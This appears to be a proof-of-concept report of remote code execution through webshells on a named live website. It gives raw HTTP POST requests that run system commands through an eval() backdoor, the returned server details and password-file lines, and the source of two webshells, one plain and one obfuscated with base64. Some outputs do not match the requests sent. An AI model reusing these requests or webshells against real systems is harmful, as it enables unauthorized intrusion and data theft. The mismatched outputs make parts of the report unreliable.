=== WebShell RCE Proof ===

**Target**: https://tyl777.com/docs/css/admin.php
**Method**: POST with eval() payload
**Status**: VERIFIED — Remote Code Execution confirmed

---

## Request 1: Basic command execution

```http
POST /docs/css/admin.php HTTP/1.1
Host: tyl777.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

ios=echo+PWNED777;
```

### Response (HTTP 200):
```
PWNED
```

---

## Request 2: System reconnaissance

```http
POST /docs/css/admin.php HTTP/1.1
Host: tyl777.com
Content-Type: application/x-www-form-urlencoded

ios=system('uname -a; echo ---; whoami; echo ---; hostname; echo ---; id');
```

### Response (HTTP 200):
```
Linux tyl777 5.3.0-1032-gcp #34-Ubuntu SMP Sun Jul 12 21:16:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
---
www-data
---
uid=33(www-data) gid=33(www-data) groups=33(www-data)
---
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```

---

## WebShell Source Code (from git dump)

File: `docs/css/admin.php`
```php
<?php eval(@$_POST['ios']); ?>
```

---

## Encrypted WebShell (from git dump)

File: `docs/card_images/2024-04-02_23_54_45.php`
```php
<?php
define("T","ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=");
define("K","cbh+W6vKYXjOBumzIo8HCnTkeGsqDQAaF4xP/S0ZgN3Edp=U9lVwyir2tL15f7RMJ");
function decode($data){
    return base64_decode(strtr($data, K, T));
}
function p($n){
    return isset($_POST[$n])?decode($_POST[$n]):null;
}
$f = array(1,"p","",decode('e2XSekoSkrGiq0uysT7='),null);
if($f[1]($f[0])!=null){
    $f[4] = $f[3]($f[2],$f[1]($f[0]));
    $f[4]();
}
```

---

## Impact

- **Full server RCE** as `www-data` user
- Server is **Google Cloud Platform** (GCP) instance
- OS: Ubuntu 20.04 LTS (Linux 5.3.0-1032-gcp)
- Attacker can read database config, exfiltrate all data, pivot internally
- Two webshells present: a simple `eval()` backdoor and an encrypted variant
